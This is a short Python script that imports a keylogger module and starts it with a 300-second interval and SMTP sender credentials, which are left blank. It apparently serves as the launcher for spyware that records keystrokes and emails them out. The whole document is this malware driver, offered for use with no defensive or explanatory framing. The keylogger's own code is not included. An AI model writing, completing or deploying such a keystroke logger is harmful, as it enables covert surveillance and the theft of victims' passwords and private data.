import keylogger

send_smtp = " "
pswd_smtp = " "

key_listener = keylogger.KeyLogger(300, send_smtp, pswd_smtp)
key_listener.start()
